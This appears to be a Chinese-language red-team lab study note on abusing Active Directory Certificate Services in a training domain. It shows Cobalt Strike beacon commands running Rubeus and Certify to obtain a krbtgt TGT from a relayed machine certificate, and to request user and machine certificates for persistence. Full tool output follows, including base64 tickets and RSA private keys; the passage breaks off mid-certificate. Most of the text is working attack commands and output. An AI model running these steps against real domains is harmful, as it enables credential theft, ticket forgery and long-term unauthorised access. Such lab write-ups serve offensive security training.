se9IiLMkUOPBlfNvXQjqH0VyU/kKzTOTO0tXsBxLwHMZvqJbtL8ws8MvS1AGA3MgFnewdTtfaR0p98PsjWS7m8lY7NHAf9OR75gFdn7INq7y2jFtrsj3evHLcz5a70H/TFMpbjNXRKULLWmyrDqUpvMZ+w9VHoHrvxP4Ceejqx1EGwSE585MOiyX9rcvTCl7Z/glYSC+F1y2hDaGEFrQApbDYQptDneGhnvxmafG3OiVv6Bjy4AE9gqhv0CxGP+v0E8xibezrsLow5zzisXQfDoUryxWGvq3l92MOjA9oy2/kQn//mPblLmaDG/AHqPeRQgKhMSu8nQn4viygMhayWKcNuQog7PRW0VBcxcd7v8ncPrJtWGZ5Dgu7AgaTYPhGkQt9f1fBTulqCVRxSrqqRVKrjBnPu9+uOHcrqO5a51eFuDX7L0iJZmipPw6x4w9wDdLf0YvUFjKejgK8SqjYZv2elkzU1tpKNyE1rRo9S8+UUqBZ/jlLRyxJ3loO/3jfLU6iT3OjoYXh7vS9pQhdO3EtCUzUNfC/AtoRZxCHJDhZSwqXJp1qPUsIJc57OkP1/ImVu/Q+7o3p2SEjM5fR0E/jUB927QBxn6APcTZnNWvsUfrq/uR/sIuVC9froUhEfO6OH4U39uAIGGSY7g5JvwV8Y7PfXBQx0KWB01JKyEm2p+JK8vbZP5lsAXamvKihuw2+hKUqT8G3X5L1DGVvqLFEY3V10dSlhHSUOfaw1G+sUEpPIg3t7BfBh4zX3fuzMoKY4S6p8xSwmguXdRzdS31pTVyBoDsN9Q9np1MZoq1R0lhMko/pMEJz1738VflXwNLohOqVQ4XkMcY7xrIftGVzr9SC5g+0Kt1RTRNIqX6lk8iPMw9LvW8xiJ/Z+HpP9xKgW26wsRzS8rIrcxiCyzSQAjJ8UwXxPbRGtdZoUoP8KoVw057uFxUVpqO3y6URyLwMdI5WlmolrsGWsfcORUsiabHL8lr/4ZfWx98doDbs7Ahw4VTHJP17xAi5AOsA118JueQyAiPBdkU0R1mBDeuwGU/t6EGNFQr3OZoUT/8jHv/U8paBwQhJqihT6a55pXnDPZmehWYqqVmFn7PEcx6BzZkUxGoMNGoH1t5NpY41J73lIwHgLDK//tV4I0dRqd//Q4kMUUbp3gqhOwCaOudbzLa4DjJDlzl8lop/IE2EHfIOXG+gvCFSwhOCFRXYol1lwVdCogBM53ZqTWn4foP92kEjMI2pROr/nzLpwWJcVuyv1UVy5X8tYkreEAVbWcDitbpYCG1FfLRfL+/vQWy4joXg6PBawqOePbxeRIxiQAmtiZrv+HWNeECZSHEgDra2WH4h9OBQAZgI+g/LBHqXoDUrGAwqyVSp+Tjuw6R5uvbZqV9KKLAbaaGXJFZvR+E0SA+k1FzDPM5bwrm2dBcgOu6/IC9pWESc6mSBBoZxVlyuXXWohmU6HoattsGuwT476M2v/w71QFn+Y8MQL0UaP9kLw+VN5NbmwsTdhlOVXhhY+r3oMXWw80oqAm5ZmUEK5rm5EKD26VAb3Qx//UDazCjFS46ylimoSXzkLB1De0uqzGkMARmNkPPazJtJ22t6IUK8mqUtktmKT3minkP0BtD6SHUHbdM41DrIR5vjzn4NHsgXWd+clSudkPQaQ8pF4f3xrH96kP0b+3VjXTVBG/Hw/aMnz4ZyvYiNO+AOQfAJS/Sc9HMoEisQ6kddnXpYB6jPUbgObgfK4T3bgVspjgNfosBL9R7rLXkeKn3a7UpgnnEVHPAmPDyX5La4MKd9bVEVU2a3AMbGFlEqGMqjIcoxK+wIJuuzI/yC3hFDACbsK10T+SdAvOwIf4eyLPrLh0CuU7KEndMzwv1GeAVS0QdF2uGZ6RrlFXGpmGDHK8T6q9OxMacYyzi97t9QpvImJsJawh+fuMziMl0OujtFZX4zL90qO7JhwKOi2rSM3VLWGMQgTjSE154BJK6ExJTAjBgkqhkiG9w0BCRUxFgQUXqXcnD8y2xGaTqxBOxsuTXKs3VgwLTAhMAkGBSsOAwIaBQAEFHk9z1xRm/AOCoX9ii57bSw4OUV3BAiC2dTvY+DMdA==
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED

```


下面根据证书的利用参考[这里](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate)


如果在srv-1上操作，会报错

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /outfile:kirbi /user:WKSTN-3$ /ptt /certificate:MIIQ3QIBAzC...vY+DMdA== /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe asktgt /outfile:C:\Users\Administrator\desktop\wkstn-3.kirbi /user:WKSTN-3$ /ptt /certificate:MIIQ3QIBAzC...vY+DMdA==
[+] host called home, sent: 596975 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Ask TGT


[+] received output:
[*] Using PKINIT with etype rc4_hmac and subject: CN=wkstn-3.cyberbotic.io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\WKSTN-3$'
[*] Using domain controller: 10.10.17.71:88

[X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN

```

这个是因为srv-1在```dev.cyberbotic.io```，申请会发向10.10.17.71这个DC

而wkstn-3是在```cyberbotic.io```，他的DC应该是10.10.15.75



在wkstn-3或者任何域```cyberbotic.io```上的主机操作
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /outfile:kirbi /user:WKSTN-3$ /ptt /certificate:MIIQ3QIBAzC...vY+DMdA== /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe asktgt /outfile:kirbi /user:WKSTN-3$ /ptt /certificate:MIIQ3QIBAzC...vY+DMdA== /nowrap
[+] host called home, sent: 596973 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Ask TGT


[+] received output:
[*] Using PKINIT with etype rc4_hmac and subject: CN=wkstn-3.cyberbotic.io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'cyberbotic.io\WKSTN-3$'
[*] Using domain controller: 10.10.15.75:88

[+] received output:
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFoDCCBZygAwIBBaEDAgEWooIEsjCCBK5hggSqMIIEpqADAgEFoQ8bDUNZQkVSQk9USUMuSU+iIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDWN5YmVyYm90aWMuaW+jggRoMIIEZKADAgESoQMCAQKiggRWBIIEUmZODi3SdN04KqWK1G7ntMZzW7nVf3MiMblNVVgK129CZQfomBK4432juAaHOvSFeYsMq3t/mIo+NnJuiyvuppmcdWDI4NhT5ak1Jmy26tN4UvOG6wOeslMzAnb8BK6OsOhi4CtfV/7UF8IRKvRp7I2JzQEOyD2SEdsDzx3K8whQ1P8onDfxTxc2a7AM9jrWetdQmK31YdP4w+RtczO7rLAXHDZyQWysVmp6ebTW2zsf66xyhFR1kdWg0513JBeYfS2pWkA1Xsqibp8cMHgxGO2GeIrJrsNurL72lkIHIxJl1ClSVlUV8hzzhtIUMnUxcl7jHEVI8pv06so4wW+gGbcXDpD9LkyeY4DytiN6TIpdbXX7e2H60JgeE8/Di5g5zI3htguBVkZiuXIY6VDe2u0lueN9LmgTi6XO7gzTqbciXmQ4fGphpQcLhIlVMHw0liKcn8j77Xd0xyhCvw5jZfmGtkYw8s/fuKHlUkEGRPtnLVkktNJC0W+kBrpVD11F35FFFinVeNQ2gVCpuXd23B1JGE6WwkBvEunl/6xTC8qkG6qC43N8P3Q4eQRybC2POejn3f/3dYHKeBo290rpMjaKS6H+UqN258Z/H3ZpmMUPS7wdYjiX2XvhzPKF58dLvDtBn7XGuDRWeMyPhR/V+2GvubNDS20HKHgtMIwHkMefq5XLIL4sRIvBk+B/hjv0HKZXdekMFUtWDfQGBQxRbkJf72tq6znqDg9GSl5FxlVgMJeCAsR/TeamKT70i3diNMbhAQVzRU6fCzeeopzxzY7dTbGDBypqEGxVhRuWizl+rhzZJNbyxx9R1QaneJSFBcaQmQZ0oyZeVt1VtkiCrR/tZTd9ojfDQrd6BwybXfLXnzmiOU/rm7zyUvKG2zqgA8R6A3Ws9yGj55cpJCS41hnn3ra8DUwGAOr90woexiylsqCrvpNyY9oA5HuA82k+3WHkLzOY2biV5ciAnaJNuvZjzF8lf9iSXrbTKDpdBLBe38bcMakczc9Fn3/HTUPcOFoFYVcTzRGZqy95c8mF27rHiC6n1Wdo8VGSbthQ+JUFnpA3J5cCZcDNsaeX5zOaa1EEQPeSpfABjG0A+PqJLyFvQkUA7ePnoFodlT/Dp2Q3L74cWIZ2WKd7oz/f4NmcwrdQgo6H2BPsW4Dox+cxY/G+3SDOP8YgFapbcbqSbslgWI36zxiht4qhcMTUUY7bprM4a4QU11WT6mkCQiVnt7Yqi+3XPtYtedTMIuXYoAa4a5P+Ln5cFJEkP2WYYy1r6SZrGlJY/9QFIfttxUJ0BqeYOA9jgZX+n7L43t7pwX/ROu6/MfBMT8D5GnoNgsRVEWg6yB+5EiqeKBVC82r0HJQcMsU1Ck0D4/I4LOsNbXa84t75NmJDCUb2C5idyKl1BVU753J5vxB8VrQS1BJdSKt3jq0aUu2YABdttQkx/hTi3YnUz2h+qwfPdOWMpi/QiUy1o4HZMIHWoAMCAQCigc4Egct9gcgwgcWggcIwgb8wgbygGzAZoAMCARehEgQQjP+88gj21IFrfTkWBvXr2aEPGw1DWUJFUkJPVElDLklPohUwE6ADAgEBoQwwChsIV0tTVE4tMySjBwMFAEDhAAClERgPMjAyMjA4MTUxNTQyNDFaphEYDzIwMjIwODE2MDE0MjQxWqcRGA8yMDIyMDgyMjE1NDI0MVqoDxsNQ1lCRVJCT1RJQy5JT6kiMCCgAwIBAqEZMBcbBmtyYnRndBsNY3liZXJib3RpYy5pbw==

[*] Ticket written to kirbi

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/cyberbotic.io
  ServiceRealm             :  CYBERBOTIC.IO
  UserName                 :  WKSTN-3$
  UserRealm                :  CYBERBOTIC.IO
  StartTime                :  8/15/2022 3:42:41 PM
  EndTime                  :  8/16/2022 1:42:41 AM
  RenewTill                :  8/22/2022 3:42:41 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  jP+88gj21IFrfTkWBvXr2Q==
  ASREP (key)              :  05FAE9FEF58DB893927EB05CBA9BD2C0



```


制作tgt
```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\wkstn-3.kirbi", [Convert]::FromBase64String("doIFoDCCBZygAwIBBaEDAgEWooIEsjCCBK5hggSqMIIEpqADAgEFoQ8bDUNZQkVSQk9USUMuSU+iIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDWN5YmVyYm90aWMuaW+jggRoMIIEZKADAgESoQMCAQKiggRWBIIEUmZODi3SdN04KqWK1G7ntMZzW7nVf3MiMblNVVgK129CZQfomBK4432juAaHOvSFeYsMq3t/mIo+NnJuiyvuppmcdWDI4NhT5ak1Jmy26tN4UvOG6wOeslMzAnb8BK6OsOhi4CtfV/7UF8IRKvRp7I2JzQEOyD2SEdsDzx3K8whQ1P8onDfxTxc2a7AM9jrWetdQmK31YdP4w+RtczO7rLAXHDZyQWysVmp6ebTW2zsf66xyhFR1kdWg0513JBeYfS2pWkA1Xsqibp8cMHgxGO2GeIrJrsNurL72lkIHIxJl1ClSVlUV8hzzhtIUMnUxcl7jHEVI8pv06so4wW+gGbcXDpD9LkyeY4DytiN6TIpdbXX7e2H60JgeE8/Di5g5zI3htguBVkZiuXIY6VDe2u0lueN9LmgTi6XO7gzTqbciXmQ4fGphpQcLhIlVMHw0liKcn8j77Xd0xyhCvw5jZfmGtkYw8s/fuKHlUkEGRPtnLVkktNJC0W+kBrpVD11F35FFFinVeNQ2gVCpuXd23B1JGE6WwkBvEunl/6xTC8qkG6qC43N8P3Q4eQRybC2POejn3f/3dYHKeBo290rpMjaKS6H+UqN258Z/H3ZpmMUPS7wdYjiX2XvhzPKF58dLvDtBn7XGuDRWeMyPhR/V+2GvubNDS20HKHgtMIwHkMefq5XLIL4sRIvBk+B/hjv0HKZXdekMFUtWDfQGBQxRbkJf72tq6znqDg9GSl5FxlVgMJeCAsR/TeamKT70i3diNMbhAQVzRU6fCzeeopzxzY7dTbGDBypqEGxVhRuWizl+rhzZJNbyxx9R1QaneJSFBcaQmQZ0oyZeVt1VtkiCrR/tZTd9ojfDQrd6BwybXfLXnzmiOU/rm7zyUvKG2zqgA8R6A3Ws9yGj55cpJCS41hnn3ra8DUwGAOr90woexiylsqCrvpNyY9oA5HuA82k+3WHkLzOY2biV5ciAnaJNuvZjzF8lf9iSXrbTKDpdBLBe38bcMakczc9Fn3/HTUPcOFoFYVcTzRGZqy95c8mF27rHiC6n1Wdo8VGSbthQ+JUFnpA3J5cCZcDNsaeX5zOaa1EEQPeSpfABjG0A+PqJLyFvQkUA7ePnoFodlT/Dp2Q3L74cWIZ2WKd7oz/f4NmcwrdQgo6H2BPsW4Dox+cxY/G+3SDOP8YgFapbcbqSbslgWI36zxiht4qhcMTUUY7bprM4a4QU11WT6mkCQiVnt7Yqi+3XPtYtedTMIuXYoAa4a5P+Ln5cFJEkP2WYYy1r6SZrGlJY/9QFIfttxUJ0BqeYOA9jgZX+n7L43t7pwX/ROu6/MfBMT8D5GnoNgsRVEWg6yB+5EiqeKBVC82r0HJQcMsU1Ck0D4/I4LOsNbXa84t75NmJDCUb2C5idyKl1BVU753J5vxB8VrQS1BJdSKt3jq0aUu2YABdttQkx/hTi3YnUz2h+qwfPdOWMpi/QiUy1o4HZMIHWoAMCAQCigc4Egct9gcgwgcWggcIwgb8wgbygGzAZoAMCARehEgQQjP+88gj21IFrfTkWBvXr2aEPGw1DWUJFUkJPVElDLklPohUwE6ADAgEBoQwwChsIV0tTVE4tMySjBwMFAEDhAAClERgPMjAyMjA4MTUxNTQyNDFaphEYDzIwMjIwODE2MDE0MjQxWqcRGA8yMDIyMDgyMjE1NDI0MVqoDxsNQ1lCRVJCT1RJQy5JT6kiMCCgAwIBAqEZMBcbBmtyYnRndBsNY3liZXJib3RpYy5pbw=="))
```


这里很奇怪，使用这个tgt还是不能访问```wkstn-3```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660579012429.png)



# User & Computer Persistence

## 用户持久性

假设现在有一个DA的beacon

```
beacon> getuid
[*] You are DEV\nlamb
```


查找模板

```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /clientauth
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660523683784.png)

需要留意的信息

有效期为1年。
不需要授权。
DEV 中的域用户具有注册权限。


申请证书

```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:User
```

返回
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:User
[*] Tasked beacon to run .NET program: Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:User
[+] host called home, sent: 279703 bytes
[+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[+] received output:

[*] Current user context    : DEV\nlamb

[+] received output:
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=Nina Lamb, CN=Users, DC=dev, DC=cyberbotic, DC=io

[+] received output:

[*] Certificate Authority   : dc-2.dev.cyberbotic.io\ca-2

[+] received output:

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 6

[+] received output:

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA5DEzZpRr17UlwRvzkQG6C/yKrUKXFKTX+PaQ5MfcvDus0MRu
vTnhRXMbX6Y+2ohJ8iGDU3crrK4vbLBOP0FOV7jWMt50dKiBsqLbpFtJh6L/tNhU
M9JM3rUbQaGxCsF0aFfN2QbigXHYFcpAnkjKXbjKCJ44DWmCK7MkDJZUrqYs3nB8
+t8RazUI3RXEC3wl0a/Gu8qViqoRubG7W3VC5Xohq7WLQ1PwMMVOqNLoHly6VZSF
B0+8+/aRXKh+IMUQNhsbvcE+h/5GJrDjL3hVbG5eHtpYb3sQrNjmprOVN841Y80O
KT5+rh/07RF8Y79AnsYVcKvvMcUIed3tL7GTeQIDAQABAoIBADTF7inAlIo/8hnN
cZBtEk5YWugD+PXEw8/nkg3e7P05XdewPh4UBzWtD70YsPuQPm25c2o3qsmWRRCB
W69EVq5x6FO+X7dlCw25nUtO81vjhfiYeSy865srzkBo+Q1QPTAuckRJU9P09LDh
Y/1XPznalRrWIId1ia26kdE5aR80jmuPBBzSdRqLtacFhdWWKyLlpsi0chXPXTrn
AJGbBW5ZekK7GR25zYaBi3hyWgO35NkdEU+qFcLrxjqg8sn661a/SvQDLDl0+iKM
YB8GRYGS93LCK8sfPJqVPgTrqog2vRyqX3aXT1SUaSb/RXIAunz2yjRNoWWHC7pL
X1PnL0sCgYEA8VdP+RPcpBXN8ABHDYEUDsl9XCxVsKWDBCAjJ+su/z6wBe6SV4zh
xQ/KAg/dgxJWiIapzXipRLIeRcYkBoYcmnyMA+pPOYaMcMcJpP+G7IFbBQcR8tFX
oa7ifnLL6prXZEtWqraABBmDIiv+BH1BczveQJqPo5ynHqpuPxJgTQ8CgYEA8g1u
tOd/hNp+ftfWto5B8GtbGi5iJA14jIBtsNN8xw2LRifYY2w2vl/fPHNLv20yS10G
qd0VMkkxqyOKjJVRMKPekVJ8FzhEg88sGav8/NsW2A33qfoSlN81Jz9wIAmbeeih
BIzEgpJR4ogL+FBS8WS98LQ7KL5HowiZqu85JvcCgYBiZKV/OADJiPY39fUB5XEn
AjCwxoZ9CU2b/fo3SSQU/hrHoFdbiF13eRNzucImsPBEoxpRYfMoxbGf4sNHQaAh
v8tZwUpheqCBTjR5Z5A7lhVkvFgt9flTOriusuC+Gjjcc/a2jMcuZLRY1zSt4d8w
OuVG03ziSHi+AOAHqNdIMwKBgGnXR85g39jG9cMfPCsNX3Xya56yI4XiQhEl41EL
2SbtHDZsG+m1muZ545J6U+f7pp9fqRdDrg4UBVzxKJc6f4sGTL880zgQCZ2dTIpZ
M0GZx45n5SD1UYS5aXOlALFxogOXnjjwGMmDk7y7gohtDyewxoFnPesd8RMwIoml
G1eXAoGAM4n4EBLiyThP6dYkHC3SoNMLsfCYbvBQJPhT4oDUqLboF9vaGYTZvphJ
aRWiErNsIdcpfCFY+kmZHhuTPgi7gftkcDU4NZcWQFmbYlbgqbivCKQ2QvVyDy3u
iluIboqyDmYR4CMQa1uqIfaweYjMeOuCTEbmt+hqPzZCbLNlEeQ=
-----END RSA PRIVATE KEY-----

[+] received output:
-----BEGIN CERTIFICATE-----
MIIGFzCCBP+gAwIBAgITKQAAAAbQAYVGEpzaIwAAAAAABjANBgkqhkiG9w0BAQsF
ADBUMRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMRMwEQYKCZImiZPyLGQBGRYDZGV2MQ0wCwYDVQQDEwRjYS0yMB4XDTIyMDgx
NTAwMjU0OFoXDTIzMDgxNTAwMjU0OFowgY0xEjAQBgoJkiaJk/IsZAEZFgJpbzEa
MBgGCgmSJomT8ixkARkWCmN5YmVyYm90aWMxEzARBgoJkiaJk/IsZAEZFgNkZXYx
DjAMBgNVBAMTBVVzZXJzMRIwEAYDVQQDEwlOaW5hIExhbWIxIjAgBgkqhkiG9w0B
CQEWE25sYW1iQGN5YmVyYm90aWMuaW8wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDkMTNmlGvXtSXBG/ORAboL/IqtQpcUpNf49pDkx9y8O6zQxG69OeFF
cxtfpj7aiEnyIYNTdyusri9ssE4/QU5XuNYy3nR0qIGyotukW0mHov+02FQz0kze
tRtBobEKwXRoV83ZBuKBcdgVykCeSMpduMoInjgNaYIrsyQMllSupizecHz63xFr
NQjdFcQLfCXRr8a7ypWKqhG5sbtbdULleiGrtYtDU/AwxU6o0ugeXLpVlIUHT7z7
9pFcqH4gxRA2Gxu9wT6H/kYmsOMveFVsbl4e2lhvexCs2Oams5U3zjVjzQ4pPn6u
H/TtEXxjv0CexhVwq+8xxQh53e0vsZN5AgMBAAGjggKmMIICojAXBgkrBgEEAYI3
FAIECh4IAFUAcwBlAHIwKQYDVR0lBCIwIAYKKwYBBAGCNwoDBAYIKwYBBQUHAwQG
CCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIFoDBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqG
SIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcw
HQYDVR0OBBYEFKtN11hDPpAMJBlM6/6s3ZfK6Ze7MB8GA1UdIwQYMBaAFETxugZf
UJBhM0s7xNzEgBrr+oF2MIHBBgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFwOi8v
L0NOPWNhLTIsQ049ZGMtMixDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1jeWJlcmJvdGljLERD
PWlvP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1j
UkxEaXN0cmlidXRpb25Qb2ludDCBuAYIKwYBBQUHAQEEgaswgagwgaUGCCsGAQUF
BzAChoGYbGRhcDovLy9DTj1jYS0yLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWN5YmVyYm90
aWMsREM9aW8/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
YXRpb25BdXRob3JpdHkwRwYDVR0RBEAwPqAnBgorBgEEAYI3FAIDoBkMF25sYW1i
QGRldi5jeWJlcmJvdGljLmlvgRNubGFtYkBjeWJlcmJvdGljLmlvMA0GCSqGSIb3
DQEBCwUAA4IBAQCC9209hQWYYQjsn0J71DhtR8FoqSnErJYcAt3YhpUvFyByYLQi
8CW2MdUKCCFmogFf+2vX/LhTEPSEsdAb2mYJHPVz3fSKCVZtR69gTp9JwVURVT9U
opHvBsAuDNWNaEn7D68LtfxowNhhdGwziv8dzclwW2iVK4BwjaGHBumTKfU3r8n2
XAcXOVsjvjbUh2xWu8IjYbDjy9bJITqeT6u/T8dmqgUd7ymVRtEhrUJYBBY8i411
agApuNL9iZJHZaf8LI3viCwOEt+3bHPjMAHYS16gGTv5S+uzP9IzGz/0kHrIsTEK
bjrPo6ljmympgFwja7ohr/2V3dXY0wqopUJU
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:17.3343555

```

申请到上面的证书以后，按照前几节的方法利用。

## 计算机持久性

> 这种情况与上面的情况并没有什么不同。机器是 AD 中的一种特殊类型的用户，可以拥有自己的证书。计算机的默认模板称为Machine（模板显示名称为Computer）。默认情况下，它们的有效期也是 1 年，不需要授权，并且所有域计算机都具有注册权限。

**注意，这里的操作需要system权限**


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660524157612.png)

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:Machine /machine
[*] Tasked beacon to run .NET program: Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:Machine /machine
[+] host called home, sent: 279727 bytes
[+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[+] received output:

[*] Current user context    : NT AUTHORITY\SYSTEM
[*] No subject name specified, using current machine as subject

[*] Template                : Machine
[*] Subject                 : CN=srv-1.dev.cyberbotic.io

[+] received output:

[*] Certificate Authority   : dc-2.dev.cyberbotic.io\ca-2

[+] received output:

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 7

[+] received output:

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzrSorSn9dltk/+KkSagtV7y6HP8JD5dbZe1qwjYhK8T1EWNp
SD3YDTHhi8/gJ1qg1R2f55/dKM1+RKF76SyGA/xUhQ4TODcaMIy9IgJYQa3peEZq
buvqv0lY5vXRRR982hlqLca5gEYlLEsg0g5GMnYTAaOf4kGlrrmTq9b7xngThIi5
5/sxOd15DD99KkPRTYB0VEVu2YD+xeE3YrCfC9djfKUBYEz3uiF8QuNt02Ew0+0H
lMd6NqMyTFYkC9cMFNgnaBeKJmwvX2+Krs6ERBPFUTLp6R4zHxTy7imBqdIWhmKX
LA8YgsEhQh+M0h2M0/KEmnecIvlLkqXUM/RnBQIDAQABAoIBABQg0/cOynNyyWZA
feJ9SbMMOexWal22Dayifp2cU0UVmA6iKU+jVA1O4OlyK9/xK42tJZPSxaCyR/wr
ZGtLjl5HfTx6pyT3eqmlHsq3wzvcEUrIwpb8Cp8nZ4yP/dmXDBuZ03TTL9+dlQOX
6kGCKdRCmq2zbv+DiHx37jkSxXApNsAmHf6VbCkVqebEqGexb5Pr5YLJ8BKx0SMJ
V4MLer/mdGzdEb+6KsuJjPVeb1/cAOQ7Rv26oqSfAVjr2W6Dn45HSdHVijr+eje6
M9qxnwQa2V2O2YVd5uIbiCQmAffI3Y42AlrtVb5Fo2WP06Mdb8pC3GgjR5VXD3Je
Sj5ZCEkCgYEA+H5ZneDa1+zgKlifZuDM9Vso/k90k5jzXIpny+gxXtd+1boXyVHB
pHV5g3zgfx4+yTxvN5qyDCupXIWW1q1gAL0xJTpBSHsg/AFaUv7QfuMQMO+/kNGi
tTlxJvFb6KLK44KpG/gePsEsGw43xeb9UuPUk7DfBf5ixy3qKCa7kl0CgYEA1PMn
sU4zzfaPX9+UC7kJ8A9JAzQ5G/iuxmQr0564gJU2xj+RfyXNzc83qWPtD3L7CtkP
yi4bZFhPfZZ7VZPvb0+3SoAY3Sav8xDizO1btbPlTfGK+OOEbWEqXE/VfFBal+3j
wlkrXFMAZMZA9qB4VNOjxBWvLpznweG1wsA4rMkCgYEAq6XrlYj64mh3uAibo17p
dRpRSMntxv7CLExWwp1TbSYCMPRo9eGJl2amV1NtZ6Gm0S7zzD8Jeiq2xHhq50O/
qwME7ag97ClRcYIluGrX7q4+Qu95LjoA4JobNUFHsXyyFVHuKqnLiqG5K784e3XB
yv4hmxt0ExnTda6brryCmOkCgYB2Y3R2w2ZTpDbTc0YoOkhHGQhbaqYxYdEw5LHk
5cHnYo1gLCkkigzf1cs5Nh+uThs5TbHUkkuSPvJ6fLW2vxcHSEc7ePnZwU9ij8m3
amJpI0lhSt8bPcn60WEujwe+JCIpgwzzmIVdv5tha0LkmhQr/Ll4IyIQhRTnmidl
zV302QKBgDjrVvq5nHGD0LjpM7WZoIPPVuVqaJVW0skAYHqVpqstgfwDkGWO6q12
qAeeLobyF7G4mOvRgKM++9OIyInWUdJvaEmBgIuLciyzvKTDzyZd2Oc6bScCwFmn
z0BA4ofdsKW9EBvdc0qJKSlSdLSnalymG5rF48lnCS17r2B3Wkhz
-----END RSA PRIVATE KEY-----

[+] received output:
-----BEGIN CERTIFICATE-----
MIIFOjCCBCKgAwIBAgITKQAAAAe7Tf5t8lbJhAAAAAAABzANBgkqhkiG9w0BAQsF
ADBUMRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMRMwEQYKCZImiZPyLGQBGRYDZGV2MQ0wCwYDVQQDEwRjYS0yMB4XDTIyMDgx
NTAwMzEyOVoXDTIzMDgxNTAwMzEyOVowIjEgMB4GA1UEAxMXc3J2LTEuZGV2LmN5
YmVyYm90aWMuaW8wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDOtKit
Kf12W2T/4qRJqC1XvLoc/wkPl1tl7WrCNiErxPURY2lIPdgNMeGLz+AnWqDVHZ/n
n90ozX5EoXvpLIYD/FSFDhM4NxowjL0iAlhBrel4Rmpu6+q/SVjm9dFFH3zaGWot
xrmARiUsSyDSDkYydhMBo5/iQaWuuZOr1vvGeBOEiLnn+zE53XkMP30qQ9FNgHRU
RW7ZgP7F4TdisJ8L12N8pQFgTPe6IXxC423TYTDT7QeUx3o2ozJMViQL1wwU2Cdo
F4ombC9fb4quzoREE8VRMunpHjMfFPLuKYGp0haGYpcsDxiCwSFCH4zSHYzT8oSa
d5wi+UuSpdQz9GcFAgMBAAGjggI1MIICMTAdBgkrBgEEAYI3FAIEEB4OAE0AYQBj
